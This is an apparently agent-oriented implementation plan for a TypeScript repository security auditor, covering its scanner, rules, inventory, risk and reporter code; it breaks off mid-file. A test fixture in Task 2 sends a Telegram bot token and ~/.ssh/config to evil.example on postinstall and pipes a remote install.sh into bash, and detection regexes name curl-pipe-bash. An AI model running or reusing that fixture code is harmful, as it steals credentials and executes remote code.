# Repository Security Auditor Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a cross-platform repository/package security auditor with a shared scanner engine, CLI, Electron UI, optional AI review providers, comprehensive reports, and a first validation scan against `grinev/opencode-telegram-bot`.

**Architecture:** Use a TypeScript npm workspaces monorepo. `packages/scanner-core` owns target resolution, static analysis, data-flow modeling, risk scoring, and report serialization. `packages/cli`, `packages/ai-review`, and `apps/electron` consume the same evidence model so CLI, CI, and desktop output stay consistent.

**Tech Stack:** Node.js 20+, TypeScript, Vitest, npm workspaces, Commander, tsx, esbuild, Electron, electron-builder, Mermaid output, SARIF JSON, OpenAI-compatible HTTP providers, Ollama-compatible local provider.

---

## File Structure

- `package.json`: root npm workspace scripts.
- `tsconfig.base.json`: shared TypeScript compiler settings.
- `vitest.config.ts`: workspace test config.
- `packages/scanner-core/src/types.ts`: canonical target, finding, graph, report, decision, and remediation types.
- `packages/scanner-core/src/targetResolver.ts`: resolves local paths, archives, GitHub URLs, npm specs, and tarball URLs into `ResolvedTarget`.
- `packages/scanner-core/src/safeArchive.ts`: safe archive extraction helpers with path traversal and symlink escape checks.
- `packages/scanner-core/src/inventory.ts`: project inventory builder for package scripts, workflows, env access, filesystem access, network calls, command execution, persistence, and Electron IPC.
- `packages/scanner-core/src/rules.ts`: deterministic rule packs.
- `packages/scanner-core/src/dataFlow.ts`: data-flow graph builder.
- `packages/scanner-core/src/risk.ts`: risk scoring and decision output.
- `packages/scanner-core/src/reporters.ts`: Markdown, JSON, SARIF, Mermaid, remediation, and decision-record serializers.
- `packages/scanner-core/src/scan.ts`: orchestration pipeline.
- `packages/scanner-core/src/index.ts`: public exports.
- `packages/scanner-core/tests/*.test.ts`: focused unit tests and fixture-driven tests.
- `packages/ai-review/src/types.ts`: provider and AI review schema.
- `packages/ai-review/src/redaction.ts`: secret redaction for provider prompts.
- `packages/ai-review/src/providers.ts`: Ollama, cloud, and custom OpenAI-compatible adapters.
- `packages/ai-review/src/review.ts`: evidence-grounded AI review workflow.
- `packages/ai-review/tests/*.test.ts`: redaction and provider request tests.
- `packages/cli/src/index.ts`: CLI entry point and commands.
- `packages/cli/tests/cli.test.ts`: CLI command behavior.
- `apps/electron/src/main.ts`: Electron main process and allowlisted IPC.
- `apps/electron/src/preload.ts`: typed preload API.
- `apps/electron/src/renderer/App.tsx`: desktop UI shell.
- `apps/electron/tests/ipc.test.ts`: IPC allowlist tests.
- `fixtures/malicious-package/*`: intentionally suspicious fixture.
- `fixtures/benign-package/*`: low-risk fixture.

---

### Task 1: Bootstrap The Monorepo

**Files:**
- Create: `package.json`
- Create: `tsconfig.base.json`
- Create: `vitest.config.ts`
- Create: `.gitignore`
- Create: `packages/scanner-core/package.json`
- Create: `packages/scanner-core/src/index.ts`
- Create: `packages/scanner-core/tests/smoke.test.ts`

- [ ] **Step 1: Create root package metadata**

Create `package.json`:

```json
{
  "name": "repository-security-auditor",
  "version": "0.1.0",
  "private": true,
  "type": "module",
  "workspaces": [
    "packages/*",
    "apps/*"
  ],
  "scripts": {
    "build": "npm run build --workspaces",
    "test": "vitest run",
    "dev:cli": "tsx packages/cli/src/index.ts",
    "dev:electron": "npm --workspace apps/electron run dev",
    "package:mac": "npm --workspace apps/electron run package:mac",
    "package:win": "npm --workspace apps/electron run package:win",
    "package:linux": "npm --workspace apps/electron run package:linux",
    "package:all": "npm --workspace apps/electron run package:all"
  },
  "devDependencies": {
    "@types/node": "^20.14.0",
    "tsx": "^4.19.0",
    "typescript": "^5.5.0",
    "vitest": "^2.0.0"
  }
}
```

- [ ] **Step 2: Add shared TypeScript config**

Create `tsconfig.base.json`:

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "strict": true,
    "esModuleInterop": true,
    "forceConsistentCasingInFileNames": true,
    "skipLibCheck": true,
    "resolveJsonModule": true,
    "declaration": true,
    "sourceMap": true,
    "outDir": "dist"
  }
}
```

- [ ] **Step 3: Add Vitest config**

Create `vitest.config.ts`:

```ts
import { defineConfig } from "vitest/config";

export default defineConfig({
  test: {
    include: ["packages/**/*.test.ts", "apps/**/*.test.ts"],
    globals: false,
    environment: "node"
  }
});
```

- [ ] **Step 4: Add ignore rules**

Create `.gitignore`:

```gitignore
node_modules
dist
coverage
.DS_Store
.superpowers
reports
scan-workspaces
*.log
```

- [ ] **Step 5: Add scanner-core package shell**

Create `packages/scanner-core/package.json`:

```json
{
  "name": "@repo-auditor/scanner-core",
  "version": "0.1.0",
  "type": "module",
  "main": "dist/index.js",
  "types": "dist/index.d.ts",
  "scripts": {
    "build": "tsc -p tsconfig.json",
    "test": "vitest run tests"
  },
  "dependencies": {
    "fast-glob": "^3.3.2",
    "yaml": "^2.5.0"
  },
  "devDependencies": {
    "typescript": "^5.5.0"
  }
}
```

Create `packages/scanner-core/tsconfig.json`:

```json
{
  "extends": "../../tsconfig.base.json",
  "compilerOptions": {
    "rootDir": "src",
    "outDir": "dist"
  },
  "include": ["src/**/*.ts"]
}
```

Create `packages/scanner-core/src/index.ts`:

```ts
export const scannerCoreVersion = "0.1.0";
```

- [ ] **Step 6: Add smoke test**

Create `packages/scanner-core/tests/smoke.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { scannerCoreVersion } from "../src/index.js";

describe("scanner core", () => {
  it("exports a version", () => {
    expect(scannerCoreVersion).toBe("0.1.0");
  });
});
```

- [ ] **Step 7: Install dependencies**

Run: `npm install`

Expected: dependencies install and `package-lock.json` is created.

- [ ] **Step 8: Run smoke test**

Run: `npm test`

Expected: one passing smoke test.

- [ ] **Step 9: Commit**

```bash
git add package.json package-lock.json tsconfig.base.json vitest.config.ts .gitignore packages/scanner-core
git commit -m "chore: bootstrap repository security auditor monorepo"
```

---

### Task 2: Define Canonical Types And Fixtures

**Files:**
- Create: `packages/scanner-core/src/types.ts`
- Modify: `packages/scanner-core/src/index.ts`
- Create: `fixtures/benign-package/package.json`
- Create: `fixtures/benign-package/src/index.ts`
- Create: `fixtures/malicious-package/package.json`
- Create: `fixtures/malicious-package/src/index.ts`
- Create: `packages/scanner-core/tests/types.test.ts`

- [ ] **Step 1: Add the core evidence model**

Create `packages/scanner-core/src/types.ts`:

```ts
export type TargetType =
  | "local-directory"
  | "local-file"
  | "archive"
  | "github"
  | "npm-package"
  | "npm-tarball"
  | "remote-archive";

export type ReviewMode = "quick-triage" | "full-audit" | "ci-gate";
export type NetworkPolicy = "online" | "no-network" | "offline";
export type RiskLevel = "Critical" | "High" | "Medium" | "Low" | "Info";
export type Confidence = "High" | "Medium" | "Low";
export type Decision = "Block" | "Needs Review" | "Monitor" | "Pass";

export interface ScanOptions {
  reviewMode: ReviewMode;
  networkPolicy: NetworkPolicy;
  outputFormats: Array<"markdown" | "json" | "sarif" | "mermaid">;
}

export interface ResolvedTarget {
  type: TargetType;
  source: string;
  localPath: string;
  provenance: Record<string, string | boolean | number>;
  networkUsed: boolean;
  trustBoundary: "local" | "remote" | "archive";
}

export interface Finding {
  id: string;
  riskLevel: RiskLevel;
  category:
    | "data-exfiltration"
    | "credential-leakage"
    | "hidden-telemetry"
    | "tracking"
    | "remote-code-execution"
    | "command-injection"
    | "supply-chain"
    | "postinstall-script"
    | "github-actions"
    | "electron-ipc"
    | "persistence"
    | "network"
    | "filesystem"
    | "environment"
    | "database";
  filePath: string;
  lineStart: number;
  lineEnd: number;
  codeSnippet: string;
  explanation: string;
  recommendedFix: string;
  evidenceTags: string[];
  source?: string;
  sink?: string;
  dataFlowId?: string;
  confidence: Confidence;
  remediation?: Remediation;
}

export interface Remediation {
  summary: string;
  saferPattern: string;
  testSuggestion: string;
  breakingChangeRisk: "High" | "Medium" | "Low";
  patchDraft?: string;
}

export interface DataFlowNode {
  id: string;
  label: string;
  kind: "source" | "process" | "local-sink" | "external-destination" | "ai-provider";
  leavesMachine: boolean;
}

export interface DataFlowEdge {
  id: string;
  from: string;
  to: string;
  label: string;
  findingIds: string[];
}

export interface DataFlowGraph {
  nodes: DataFlowNode[];
  edges: DataFlowEdge[];
}

export interface RiskAssessment {
  overallRiskLevel: RiskLevel;
  decision: Decision;
  rationale: string;
  topRisks: string[];
  severityCounts: Record<RiskLevel, number>;
  categoryCounts: Record<string, number>;
  blockingFindingIds: string[];
  residualRisk: string;
  scanLimitations: string[];
}

export interface AuditReport {
  target: ResolvedTarget;
  findings: Finding[];
  dataFlow: DataFlowGraph;
  risk: RiskAssessment;
  generatedAt: string;
  toolVersion: string;
}
```

- [ ] **Step 2: Export the types**

Modify `packages/scanner-core/src/index.ts`:

```ts
export const scannerCoreVersion = "0.1.0";
export type {
  AuditReport,
  Confidence,
  DataFlowEdge,
  DataFlowGraph,
  DataFlowNode,
  Decision,
  Finding,
  NetworkPolicy,
  Remediation,
  ResolvedTarget,
  ReviewMode,
  RiskAssessment,
  RiskLevel,
  ScanOptions,
  TargetType
} from "./types.js";
```

- [ ] **Step 3: Add benign fixture**

Create `fixtures/benign-package/package.json`:

```json
{
  "name": "benign-package",
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "test": "node src/index.ts"
  },
  "dependencies": {}
}
```

Create `fixtures/benign-package/src/index.ts`:

```ts
export function greet(name: string): string {
  return `hello ${name}`;
}
```

- [ ] **Step 4: Add malicious fixture**

Create `fixtures/malicious-package/package.json`:

```json
{
  "name": "malicious-package",
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "postinstall": "node src/index.ts"
  },
  "dependencies": {
    "left-pad": "github:some-user/suspicious-repo"
  }
}
```

Create `fixtures/malicious-package/src/index.ts`:

```ts
import { exec } from "node:child_process";
import { readFileSync } from "node:fs";
import https from "node:https";

const token = process.env.TELEGRAM_BOT_TOKEN;
const sshConfig = readFileSync(`${process.env.HOME}/.ssh/config`, "utf8");

https.request("https://evil.example/collect", { method: "POST" }).end(
  JSON.stringify({ token, sshConfig })
);

exec(`curl https://evil.example/install.sh | bash`);
```

- [ ] **Step 5: Test type-level fixture assumptions**

Create `packages/scanner-core/tests/types.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import type { Finding, RiskAssessment } from "../src/index.js";

describe("core types", () => {
  it("supports blocking security findings", () => {
    const finding: Finding = {
      id: "finding-1",
      riskLevel: "Critical",
      category: "data-exfiltration",
      filePath: "src/index.ts",
      lineStart: 1,
      lineEnd: 5,
      codeSnippet: "https.request('https://evil.example')",
      explanation: "Sensitive data is sent to an external destination.",
      recommendedFix: "Remove the outbound request or require explicit user consent.",
      evidenceTags: ["network", "secret-source"],
      confidence: "High"
    };

    expect(finding.riskLevel).toBe("Critical");
  });

  it("supports decision output", () => {
    const risk: RiskAssessment = {
      overallRiskLevel: "Critical",
      decision: "Block",
      rationale: "A critical exfiltration finding is present.",
      topRisks: ["Sensitive data leaves the machine."],
      severityCounts: { Critical: 1, High: 0, Medium: 0, Low: 0, Info: 0 },
      categoryCounts: { "data-exfiltration": 1 },
      blockingFindingIds: ["finding-1"],
      residualRisk: "Do not run until the exfiltration path is removed.",
      scanLimitations: ["Static analysis only."]
    };

    expect(risk.decision).toBe("Block");
  });
});
```

- [ ] **Step 6: Run tests**

Run: `npm test`

Expected: smoke and type tests pass.

- [ ] **Step 7: Commit**

```bash
git add packages/scanner-core fixtures
git commit -m "feat: define scanner evidence model and fixtures"
```

---

### Task 3: Implement Target Resolver And Safe Acquisition Model

**Files:**
- Create: `packages/scanner-core/src/targetResolver.ts`
- Create: `packages/scanner-core/src/safeArchive.ts`
- Modify: `packages/scanner-core/src/index.ts`
- Create: `packages/scanner-core/tests/targetResolver.test.ts`

- [ ] **Step 1: Write target resolver tests**

Create `packages/scanner-core/tests/targetResolver.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { resolveTarget } from "../src/targetResolver.js";

describe("resolveTarget", () => {
  it("resolves local directories without network", async () => {
    const target = await resolveTarget("../../fixtures/benign-package", {
      reviewMode: "full-audit",
      networkPolicy: "offline",
      outputFormats: ["json"]
    });

    expect(target.type).toBe("local-directory");
    expect(target.networkUsed).toBe(false);
    expect(target.trustBoundary).toBe("local");
  });

  it("rejects remote targets when network is disabled", async () => {
    await expect(
      resolveTarget("https://github.com/grinev/opencode-telegram-bot", {
        reviewMode: "full-audit",
        networkPolicy: "no-network",
        outputFormats: ["json"]
      })
    ).rejects.toThrow("Network access is disabled");
  });

  it("recognizes npm package specs", async () => {
    const target = await resolveTarget("left-pad@1.3.0", {
      reviewMode: "full-audit",
      networkPolicy: "online",
      outputFormats: ["json"]
    });

    expect(target.type).toBe("npm-package");
    expect(target.source).toBe("left-pad@1.3.0");
    expect(target.networkUsed).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify failure**

Run: `npm test -- packages/scanner-core/tests/targetResolver.test.ts`

Expected: FAIL because `targetResolver.ts` does not exist.

- [ ] **Step 3: Implement safe archive helpers**

Create `packages/scanner-core/src/safeArchive.ts`:

```ts
import path from "node:path";

export function assertSafeArchiveEntry(entryName: string, outputDir: string): string {
  const targetPath = path.resolve(outputDir, entryName);
  const normalizedOutput = path.resolve(outputDir);

  if (!targetPath.startsWith(`${normalizedOutput}${path.sep}`) && targetPath !== normalizedOutput) {
    throw new Error(`Archive entry escapes output directory: ${entryName}`);
  }

  if (path.isAbsolute(entryName)) {
    throw new Error(`Archive entry uses an absolute path: ${entryName}`);
  }

  return targetPath;
}

export function isSupportedArchive(filePath: string): boolean {
  return filePath.endsWith(".zip") || filePath.endsWith(".tgz") || filePath.endsWith(".tar.gz");
}
```

- [ ] **Step 4: Implement target resolver**

Create `packages/scanner-core/src/targetResolver.ts`:

```ts
import fs from "node:fs/promises";
import path from "node:path";
import type { ResolvedTarget, ScanOptions } from "./types.js";
import { isSupportedArchive } from "./safeArchive.js";

const GITHUB_RE = /^https:\/\/github\.com\/[^/\s]+\/[^/\s]+(?:\.git)?$/;
const HTTP_ARCHIVE_RE = /^https:\/\/.+\.(?:zip|tgz|tar\.gz)$/;
const NPM_TARBALL_RE = /^https:\/\/registry\.npmjs\.org\/.+\.tgz$/;
const NPM_SPEC_RE = /^(?:@[^/\s]+\/)?[^@\s/]+(?:@[\w.-]+)?$/;

export async function resolveTarget(input: string, options: ScanOptions): Promise<ResolvedTarget> {
  if (isRemoteTarget(input) && options.networkPolicy !== "online") {
    throw new Error("Network access is disabled for this target");
  }

  const absolutePath = path.resolve(input);
  const stat = await fs.stat(absolutePath).catch(() => undefined);

  if (stat?.isDirectory()) {
    return {
      type: "local-directory",
      source: input,
      localPath: absolutePath,
      provenance: { source: input },
      networkUsed: false,
      trustBoundary: "local"
    };
  }

  if (stat?.isFile()) {
    return {
      type: isSupportedArchive(absolutePath) ? "archive" : "local-file",
      source: input,
      localPath: absolutePath,
      provenance: { source: input },
      networkUsed: false,
      trustBoundary: isSupportedArchive(absolutePath) ? "archive" : "local"
    };
  }

  if (GITHUB_RE.test(input)) {
    return remote("github", input);
  }

  if (NPM_TARBALL_RE.test(input)) {
    return remote("npm-tarball", input);
  }

  if (HTTP_ARCHIVE_RE.test(input)) {
    return remote("remote-archive", input);
  }

  if (NPM_SPEC_RE.test(input)) {
    return remote("npm-package", input);
  }

  throw new Error(`Unsupported target: ${input}`);
}

function remote(type: ResolvedTarget["type"], source: string): ResolvedTarget {
  return {
    type,
    source,
    localPath: "",
    provenance: { source },
    networkUsed: true,
    trustBoundary: type === "github" || type === "npm-package" ? "remote" : "archive"
  };
}

function isRemoteTarget(input: string): boolean {
  return input.startsWith("https://") || NPM_SPEC_RE.test(input);
}
```

- [ ] **Step 5: Export target resolver**

Modify `packages/scanner-core/src/index.ts`:

```ts
export const scannerCoreVersion = "0.1.0";
export { assertSafeArchiveEntry, isSupportedArchive } from "./safeArchive.js";
export { resolveTarget } from "./targetResolver.js";
export type {
  AuditReport,
  Confidence,
  DataFlowEdge,
  DataFlowGraph,
  DataFlowNode,
  Decision,
  Finding,
  NetworkPolicy,
  Remediation,
  ResolvedTarget,
  ReviewMode,
  RiskAssessment,
  RiskLevel,
  ScanOptions,
  TargetType
} from "./types.js";
```

- [ ] **Step 6: Run target resolver tests**

Run: `npm test -- packages/scanner-core/tests/targetResolver.test.ts`

Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add packages/scanner-core/src packages/scanner-core/tests
git commit -m "feat: add target resolver and safe archive checks"
```

---

### Task 4: Build Project Inventory

**Files:**
- Create: `packages/scanner-core/src/fileWalker.ts`
- Create: `packages/scanner-core/src/inventory.ts`
- Modify: `packages/scanner-core/src/index.ts`
- Create: `packages/scanner-core/tests/inventory.test.ts`

- [ ] **Step 1: Write inventory tests**

Create `packages/scanner-core/tests/inventory.test.ts`:

```ts
import path from "node:path";
import { describe, expect, it } from "vitest";
import { buildInventory } from "../src/inventory.js";

describe("buildInventory", () => {
  it("detects package scripts, dependency sources, env access, network calls, filesystem, and commands", async () => {
    const fixture = path.resolve("../../fixtures/malicious-package");
    const inventory = await buildInventory(fixture);

    expect(inventory.packageScripts).toContainEqual({
      name: "postinstall",
      command: "node src/index.ts",
      filePath: "package.json"
    });
    expect(inventory.dependencySources).toContain("github:some-user/suspicious-repo");
    expect(inventory.environmentVariables).toContain("TELEGRAM_BOT_TOKEN");
    expect(inventory.networkEndpoints).toContain("https://evil.example/collect");
    expect(inventory.commandExecutions.length).toBeGreaterThan(0);
    expect(inventory.filesystemReads.length).toBeGreaterThan(0);
  });
});
```

- [ ] **Step 2: Run test to verify failure**

Run: `npm test -- packages/scanner-core/tests/inventory.test.ts`

Expected: FAIL because `inventory.ts` does not exist.

- [ ] **Step 3: Implement file walker**

Create `packages/scanner-core/src/fileWalker.ts`:

```ts
import fg from "fast-glob";

export async function listScannableFiles(rootDir: string): Promise<string[]> {
  return fg(
    [
      "**/*.{js,jsx,ts,tsx,mjs,cjs,json,yml,yaml,sh,bash,zsh,Dockerfile}",
      ".github/workflows/*.{yml,yaml}"
    ],
    {
      cwd: rootDir,
      dot: true,
      onlyFiles: true,
      ignore: ["node_modules/**", "dist/**", ".git/**", "coverage/**"]
    }
  );
}
```

- [ ] **Step 4: Implement inventory builder**

Create `packages/scanner-core/src/inventory.ts`:

```ts
import fs from "node:fs/promises";
import path from "node:path";
import { listScannableFiles } from "./fileWalker.js";

export interface PackageScript {
  name: string;
  command: string;
  filePath: string;
}

export interface ProjectInventory {
  files: string[];
  packageScripts: PackageScript[];
  dependencySources: string[];
  environmentVariables: string[];
  networkEndpoints: string[];
  commandExecutions: Array<{ filePath: string; line: number; snippet: string }>;
  filesystemReads: Array<{ filePath: string; line: number; snippet: string }>;
  githubWorkflowFiles: string[];
  electronIpcFiles: string[];
  persistenceIndicators: Array<{ filePath: string; line: number; snippet: string }>;
}

export async function buildInventory(rootDir: string): Promise<ProjectInventory> {
  const files = await listScannableFiles(rootDir);
  const inventory: ProjectInventory = {
    files,
    packageScripts: [],
    dependencySources: [],
    environmentVariables: [],
    networkEndpoints: [],
    commandExecutions: [],
    filesystemReads: [],
    githubWorkflowFiles: [],
    electronIpcFiles: [],
    persistenceIndicators: []
  };

  for (const filePath of files) {
    const fullPath = path.join(rootDir, filePath);
    const content = await fs.readFile(fullPath, "utf8").catch(() => "");

    if (filePath === "package.json") {
      collectPackageJson(content, inventory);
    }

    if (filePath.startsWith(".github/workflows/")) {
      inventory.githubWorkflowFiles.push(filePath);
    }

    collectRegex(content, /process\.env\.([A-Z0-9_]+)/g, (match) => inventory.environmentVariables.push(match[1]));
    collectRegex(content, /https?:\/\/[^\s"'`)]+/g, (match) => inventory.networkEndpoints.push(match[0]));
    collectLineMatches(content, filePath, /(child_process|exec\(|spawn\(|execFile\(|curl\s+.*\|\s*bash)/, inventory.commandExecutions);
    collectLineMatches(content, filePath, /(readFileSync|readFile\(|createReadStream)/, inventory.filesystemReads);
    collectLineMatches(content, filePath, /(LaunchAgent|systemd|crontab|Startup|RunOnce|pm2|daemon)/i, inventory.persistenceIndicators);

    if (/ipcMain\.(handle|on)|contextBridge|nodeIntegration|contextIsolation/.test(content)) {
      inventory.electronIpcFiles.push(filePath);
    }
  }

  inventory.environmentVariables = unique(inventory.environmentVariables);
  inventory.networkEndpoints = unique(inventory.networkEndpoints);
  inventory.dependencySources = unique(inventory.dependencySources);

  return inventory;
}

function collectPackageJson(content: string, inventory: ProjectInventory): void {
  const parsed = JSON.parse(content) as {
    scripts?: Record<string, string>;
    dependencies?: Record<string, string>;
    devDependencies?: Record<string, string>;
  };

  for (const [name, command] of Object.entries(parsed.scripts ?? {})) {
    inventory.packageScripts.push({ name, command, filePath: "package.json" });
  }

  for (const deps of [parsed.dependencies, parsed.devDependencies]) {
    for (const source of Object.values(deps ?? {})) {
      if (source.startsWith("github:") || source.startsWith("git+") || source.startsWith("http") || source.startsWith("file:")) {
        inventory.dependencySources.push(source);
      }
    }
  }
}

function collectRegex(content: string, regex: RegExp, onMatch: (match: RegExpExecArray) => void): void {
  for (let match = regex.exec(content); match; match = regex.exec(content)) {
    onMatch(match);
  }
}

function collectLineMatches(
  content: string,
  filePath: string,
  regex: RegExp,
  output: Array<{ filePath: string; line: number; snippet: string }>
): void {
  content.split(/\r?\n/).forEach((lineText, index) => {
    if (regex.test(lineText)) {
      output.push({ filePath, line: index + 1, snippet: lineText.trim() });
    }
  });
}

function unique(values: string[]): string[] {
  return Array.from(new Set(values)).sort();
}
```

- [ ] **Step 5: Export inventory functions**

Modify `packages/scanner-core/src/index.ts` to include:

```ts
export { buildInventory } from "./inventory.js";
export type { PackageScript, ProjectInventory } from "./inventory.js";
```

- [ ] **Step 6: Run inventory tests**

Run: `npm test -- packages/scanner-core/tests/inventory.test.ts`

Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add packages/scanner-core/src packages/scanner-core/tests
git commit -m "feat: build project security inventory"
```

---

### Task 5: Implement Deterministic Rules

**Files:**
- Create: `packages/scanner-core/src/rules.ts`
- Modify: `packages/scanner-core/src/index.ts`
- Create: `packages/scanner-core/tests/rules.test.ts`

- [ ] **Step 1: Write rule tests**

Create `packages/scanner-core/tests/rules.test.ts`:

```ts
import path from "node:path";
import { describe, expect, it } from "vitest";
import { buildInventory } from "../src/inventory.js";
import { runRules } from "../src/rules.js";

describe("runRules", () => {
  it("creates findings for postinstall, command execution, exfiltration candidates, and risky dependencies", async () => {
    const root = path.resolve("../../fixtures/malicious-package");
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings.some((finding) => finding.category === "postinstall-script")).toBe(true);
    expect(findings.some((finding) => finding.category === "command-injection")).toBe(true);
    expect(findings.some((finding) => finding.category === "data-exfiltration")).toBe(true);
    expect(findings.some((finding) => finding.category === "supply-chain")).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify failure**

Run: `npm test -- packages/scanner-core/tests/rules.test.ts`

Expected: FAIL because `rules.ts` does not exist.

- [ ] **Step 3: Implement rule engine**

Create `packages/scanner-core/src/rules.ts`:

```ts
import type { Finding, RiskLevel } from "./types.js";
import type { ProjectInventory } from "./inventory.js";

export function runRules(inventory: ProjectInventory): Finding[] {
  const findings: Finding[] = [];

  for (const script of inventory.packageScripts) {
    if (["preinstall", "install", "postinstall", "prepare", "prepack", "postpack"].includes(script.name)) {
      findings.push(finding({
        category: "postinstall-script",
        riskLevel: "High",
        filePath: script.filePath,
        snippet: `"${script.name}": "${script.command}"`,
        explanation: `The package defines a ${script.name} lifecycle script. Lifecycle scripts run during installation and can execute code before review.`,
        fix: "Remove install-time side effects or move setup behind an explicit user command.",
        tags: ["package-script", script.name]
      }));
    }
  }

  for (const source of inventory.dependencySources) {
    findings.push(finding({
      category: "supply-chain",
      riskLevel: source.startsWith("file:") ? "Medium" : "High",
      filePath: "package.json",
      snippet: source,
      explanation: "Dependency source uses git, HTTP, tarball, or local file resolution rather than a pinned registry version.",
      fix: "Replace with a pinned registry version and verify the lockfile integrity.",
      tags: ["dependency-source"]
    }));
  }

  for (const command of inventory.commandExecutions) {
    findings.push(finding({
      category: "command-injection",
      riskLevel: command.snippet.includes("| bash") ? "Critical" : "High",
      filePath: command.filePath,
      lineStart: command.line,
      lineEnd: command.line,
      snippet: command.snippet,
      explanation: "The code invokes shell or process execution. If user-controlled data reaches this call, it can become command injection or RCE.",
      fix: "Avoid shell execution. Use safe APIs with explicit argument arrays and strict input validation.",
      tags: ["command-execution"]
    }));
  }

  for (const endpoint of inventory.networkEndpoints) {
    const hasSensitiveSource = inventory.environmentVariables.length > 0 || inventory.filesystemReads.length > 0;
    findings.push(finding({
      category: hasSensitiveSource ? "data-exfiltration" : "network",
      riskLevel: hasSensitiveSource ? "High" : "Info",
      filePath: "inventory",
      snippet: endpoint,
      explanation: hasSensitiveSource
        ? "The project contains outbound network communication and sensitive local sources. Review whether sensitive data can flow to this destination."
        : "The project communicates with an external endpoint. Confirm this behavior is expected.",
      fix: "Document expected endpoints, minimize payloads, and require explicit consent before sending sensitive data.",
      tags: ["network-endpoint"],
      sink: endpoint
    }));
  }

  return findings.map((item, index) => ({ ...item, id: `finding-${index + 1}` }));
}

function finding(input: {
  category: Finding["category"];
  riskLevel: RiskLevel;
  filePath: string;
  lineStart?: number;
  lineEnd?: number;
  snippet: string;
  explanation: string;
  fix: string;
  tags: string[];
  sink?: string;
}): Finding {
  return {
    id: "",
    riskLevel: input.riskLevel,
    category: input.category,
    filePath: input.filePath,
    lineStart: input.lineStart ?? 1,
    lineEnd: input.lineEnd ?? input.lineStart ?? 1,
    codeSnippet: input.snippet,
    explanation: input.explanation,
    recommendedFix: input.fix,
    evidenceTags: input.tags,
    sink: input.sink,
    confidence: input.riskLevel === "Info" ? "Medium" : "High"
  };
}
```

- [ ] **Step 4: Export rules**

Modify `packages/scanner-core/src/index.ts` to include:

```ts
export { runRules } from "./rules.js";
```

- [ ] **Step 5: Run rule tests**

Run: `npm test -- packages/scanner-core/tests/rules.test.ts`

Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add packages/scanner-core/src packages/scanner-core/tests
git commit -m "feat: add deterministic security rules"
```

---

### Task 6: Implement Data Flow, Risk Assessment, And Reporters

**Files:**
- Create: `packages/scanner-core/src/dataFlow.ts`
- Create: `packages/scanner-core/src/risk.ts`
- Create: `packages/scanner-core/src/reporters.ts`
- Modify: `packages/scanner-core/src/index.ts`
- Create: `packages/scanner-core/tests/reporters.test.ts`

- [ ] **Step 1: Write reporter tests**

Create `packages/scanner-core/tests/reporters.test.ts`:

```ts
import path from "node:path";
import { describe, expect, it } from "vitest";
import { buildInventory } from "../src/inventory.js";
import { runRules } from "../src/rules.js";
import { buildDataFlowGraph } from "../src/dataFlow.js";
import { assessRisk } from "../src/risk.js";
import { renderMarkdownReport, renderMermaidDataFlow } from "../src/reporters.js";

describe("reporters", () => {
  it("renders risk, findings, recommendations, and outbound data flow", async () => {
    const root = path.resolve("../../fixtures/malicious-package");
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);
    const dataFlow = buildDataFlowGraph(inventory, findings);
    const risk = assessRisk(findings);

    const markdown = renderMarkdownReport({
      target: {
        type: "local-directory",
        source: root,
        localPath: root,
        provenance: { source: root },
        networkUsed: false,
        trustBoundary: "local"
      },
      findings,
      dataFlow,
      risk,
      generatedAt: "2026-06-14T00:00:00.000Z",
      toolVersion: "0.1.0"
    });

    expect(risk.decision).toBe("Block");
    expect(markdown).toContain("Executive Summary");
    expect(markdown).toContain("Recommended Fix");
    expect(renderMermaidDataFlow(dataFlow)).toContain("evil.example");
  });
});
```

- [ ] **Step 2: Run test to verify failure**

Run: `npm test -- packages/scanner-core/tests/reporters.test.ts`

Expected: FAIL because reporter modules do not exist.

- [ ] **Step 3: Implement data-flow graph builder**

Create `packages/scanner-core/src/dataFlow.ts`:

```ts
import type { Finding, DataFlowGraph } from "./types.js";
import type { ProjectInventory } from "./inventory.js";

export function buildDataFlowGraph(inventory: ProjectInventory, findings: Finding[]): DataFlowGraph {
  const nodes = [
    ...inventory.environmentVariables.map((name) => ({
      id: `env:${name}`,
      label: `env:${name}`,
      kind: "source" as const,
      leavesMachine: false
    })),
    ...inventory.networkEndpoints.map((endpoint) => ({
      id: `external:${endpoint}`,
      label: endpoint,
      kind: "external-destination" as const,
      leavesMachine: true
    }))
  ];

  const edges = inventory.networkEndpoints.flatMap((endpoint) =>
    inventory.environmentVariables.map((envName) => ({
      id: `edge:${envName}->${endpoint}`,
      from: `env:${envName}`,
      to: `external:${endpoint}`,
      label: "possible outbound flow",
      findingIds: findings.filter((finding) => finding.sink === endpoint).map((finding) => finding.id)
    }))
  );

  return { nodes, edges };
}
```

- [ ] **Step 4: Implement risk assessment**

Create `packages/scanner-core/src/risk.ts`:

```ts
import type { Decision, Finding, RiskAssessment, RiskLevel } from "./types.js";

const riskOrder: RiskLevel[] = ["Critical", "High", "Medium", "Low", "Info"];

export function assessRisk(findings: Finding[]): RiskAssessment {
  const severityCounts = countByRisk(findings);
  const categoryCounts: Record<string, number> = {};
  for (const finding of findings) {
    categoryCounts[finding.category] = (categoryCounts[finding.category] ?? 0) + 1;
  }

  const blocking = findings.filter((finding) =>
    finding.riskLevel === "Critical" ||
    (finding.riskLevel === "High" &&
      finding.confidence === "High" &&
      ["data-exfiltration", "credential-leakage", "command-injection", "remote-code-execution", "persistence", "postinstall-script", "github-actions"].includes(finding.category))
  );

  const overallRiskLevel = riskOrder.find((risk) => severityCounts[risk] > 0) ?? "Info";
  const decision: Decision = blocking.length > 0 ? "Block" : severityCounts.High > 0 || severityCounts.Medium > 0 ? "Needs Review" : severityCounts.Low > 0 ? "Monitor" : "Pass";

  return {
    overallRiskLevel,
    decision,
    rationale: decision === "Block"
